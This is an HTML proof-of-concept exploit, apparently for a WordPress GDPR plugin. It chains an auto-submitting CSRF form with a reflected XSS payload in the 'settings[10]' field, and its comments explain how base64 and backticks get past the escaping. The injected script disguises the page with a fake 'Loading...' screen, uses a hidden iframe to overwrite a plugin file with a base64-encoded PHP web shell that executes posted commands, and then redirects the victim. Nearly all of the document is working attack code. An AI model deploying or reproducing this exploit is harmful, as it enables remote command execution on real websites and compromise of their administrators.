<html>
<body>
    <form action="{{TARGET_WP}}/wp-admin/admin-ajax.php" method="POST">
        <input type="hidden" name="action" value="check&#95;privacy&#95;settings">
        <input type="hidden" name="settings&#91;10&#93;" value="" id="payload">
    </form>

    <h1 style="font-size:50px;font-weight:bold;">Loading...</h1>

    <script>
    /**
     * On the vulnerable endpoint, we will trigger an XSS.
     * The value passed to settings[10] POST argument will be returned without
     * sanitization, and with a bad "text/html" Content-Type.
     * Note : a json_encode() is applied to the whole response, then some
     * characters will be escaped : ", ', /, and \
     * We then can't use <script></ script> because the closing tag won't be
     * interpreted and so the JS code won't be executed.
     *
     * We have to use <body onload=PAYLOAD>, but WITHOUT spaces & quotes...
     * And as we want to execute a complete script with spaces, we have to find
     * a way to bypass these restrictions.
     *
     * First option, to bypass, is to convert our payload into an array of
     * charcodes, JSON-stringified and with spaces removed :
     *   var getcharcodes = function(str){
     *     return str.split('').map(x => x.charCodeAt());
     *   };
     *   var maliciousscript = getcharcodes("console.log('Hello World');");
     *   maliciousscript = JSON.stringify(maliciousscript).replace(' ', '');
     *   var payload = "<body onload=eval(String.fromCharCode.apply(null,"+maliciousscript+"))>";
     *
     * Second option, easier, is to use template literals in place of standard
     * strings (because backticks `` are not escaped), and encode the whole
     * payload in base64 :
     *    var maliciousscript = btoa("console.log('Hello World');");
     *    var payload = "<body onload=eval(atob(`"+maliciousscript+"`))>";
     */
    var maliciousscript = btoa(`
    // Edit CSS to hide everything except a "Loading..." text
    headtag = document.getElementsByTagName("head")[0];
    stylecss = document.createElement("style");
    stylecss.innerHTML = "* { display:none !important; }html {display:block !important;height:100% !important;width:100% !important;background:white !important;}html:before {display:block !important;color:black !important;font-weight:bold !important;content:'Loading...' !important;font-size:50px !important;}body {display:none !important;visibility:hidden !important;overflow:hidden !important;}"
    headtag.appendChild(stylecss);

    // Create an (hidden) iframe element that will load the plugin editor page (admin area)
    // We will upload a webshell to /wp-content/plugins/wordpress-gdpr/public/index.php
    var ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", "plugin-editor.php?file=wordpress-gdpr%2Fpublic%2Findex.php&plugin=wordpress-gdpr%2Fwordpress-gdpr.php");
    ifrm.style.width = "0px";
    ifrm.style.height = "0px";
    ifrm.id = "iframe";
    document.body.appendChild(ifrm);

    // Once the iframe (plugin editor form) is loaded, we will replace the code content
    // by our PHP webshell code
    miniwin = document.getElementById('iframe').contentWindow;
    miniwin.onload = () => {
        minidom = miniwin.document;
        if (minidom.head.innerHTML.includes('plugin-editor-php') && minidom.body.innerHTML.includes('file=wordpress-gdpr')) {
            // Wait because we want all the JS stack to be loaded
            setTimeout(() => {
                editor = miniwin.wp.themePluginEditor.instance.codemirror;
                // Upload a classical webshell
                // (taken there : https://github.com/artyuum/Simple-PHP-Web-Shell - and minified)
                editor.setValue(atob('PD9waHAgaWYoIWVtcHR5KCRfUE9TVFsnY21kJ10pKXskY21kPXNoZWxsX2V4ZWMoJF9QT1NUWydjbWQnXSk7fSA/PjwhZG9jdHlwZWh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij48bWV0YSBjb250ZW50PSJJRT1lZGdlImh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSI+PG1ldGEgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSJuYW1lPSJ2aWV3cG9ydCI+PHRpdGxlPldlYiBTaGVsbDwvdGl0bGU+PHN0eWxlPip7LXdlYmtpdC1ib3gtc2l6aW5nOmJvcmRlci1ib3g7Ym94LXNpemluZzpib3JkZXItYm94fWJvZHl7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjtjb2xvcjpyZ2JhKDAsMCwwLC43NSl9bWFpbnttYXJnaW46YXV0bzttYXgtd2lkdGg6ODUwcHh9YnV0dG9uLGlucHV0LHByZXtib3JkZXItcmFkaXVzOjVweH1idXR0b24saW5wdXQscHJle2JhY2tncm91bmQtY29sb3I6I2VmZWZlZn1sYWJlbHtkaXNwbGF5OmJsb2NrfWlucHV0e3dpZHRoOjEwMCU7YmFja2dyb3VuZC1jb2xvcjojZWZlZmVmO2JvcmRlcjoycHggc29saWQgdHJhbnNwYXJlbnR9aW5wdXQ6Zm9jdXN7b3V0bGluZTowO2JhY2tncm91bmQ6MCAwO2JvcmRlcjoycHggc29saWQgI2U2ZTZlNn1idXR0b257Ym9yZGVyOm5vbmU7Y3Vyc29yOnBvaW50ZXI7bWFyZ2luLWxlZnQ6NXB4fWJ1dHRvbjpob3ZlcntiYWNrZ3JvdW5kLWNvbG9yOiNlNmU2ZTZ9YnV0dG9uLGlucHV0LHByZXtwYWRkaW5nOjEwcHh9LmZvcm0tZ3JvdXB7ZGlzcGxheTotd2Via2l0LWJveDtkaXNwbGF5Oi1tcy1mbGV4Ym94O2Rpc3BsYXk6ZmxleDtwYWRkaW5nOjE1cHggMH08L3N0eWxlPjwvaGVhZD48Ym9keT48bWFpbj48aDE+V2ViIFNoZWxsPC9oMT48aDI+RXhlY3V0ZSBhIGNvbW1hbmQ8L2gyPjxmb3JtIG1ldGhvZD0icG9zdCI+PGxhYmVsIGZvcj0iY21kIj48c3Ryb25nPkNvbW1hbmQ8L3N0cm9uZz48L2xhYmVsPjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxpbnB1dCBhdXRvZm9jdXMgaWQ9ImNtZCJuYW1lPSJjbWQib25mb2N1cz0idGhpcy5zZXRTZWxlY3Rpb25SYW5nZSh0aGlzLnZhbHVlLmxlbmd0aCx0aGlzLnZhbHVlLmxlbmd0aCkicmVxdWlyZWQgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydjbWQnXSxFTlRfUVVPVEVTLCdVVEYtOCcpPz4iPiA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+RXhlY3V0ZTwvYnV0dG9uPjwvZGl2PjwvZm9ybT48P3BocCBpZigkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXT09PSdQT1NUJyk6ID8+PGgyPk91dHB1dDwvaDI+PD9waHAgaWYoaXNzZXQoJGNtZCkpOiA/PjxwcmU+PD89aHRtbHNwZWNpYWxjaGFycygkY21kLEVOVF9RVU9URVMsJ1VURi04Jyk/PjwvcHJlPjw/cGhwIGVsc2U6ID8+PHByZT48c21hbGw+Tm8gcmVzdWx0Ljwvc21hbGw+PC9wcmU+PD9waHAgZW5kaWY7ID8+PD9waHAgZW5kaWY7ID8+PC9tYWluPjwvYm9keT48L2h0bWw+'));
                minidom.getElementById('submit').click();

                // Then redirect the victim to a specified URL
                setTimeout(() => {
                    top.document.body.innerHTML = "";
                    top.location.href = "{{REDIRECT_URL_SUCCESS}}";
                }, 500);
            }, 2000);
        }
        else {
            // Redirect the victim in case of failure as well, but to another location
            top.document.body.innerHTML = "";
            top.location.href = "{{REDIRECT_URL_FAILURE}}";
        }
    };
    `);
    var payload = "<body onload=eval(atob(`"+maliciousscript+"`))>";
    document.getElementById('payload').value = payload;
    document.forms[0].submit();
    </script>
</body>
</html>
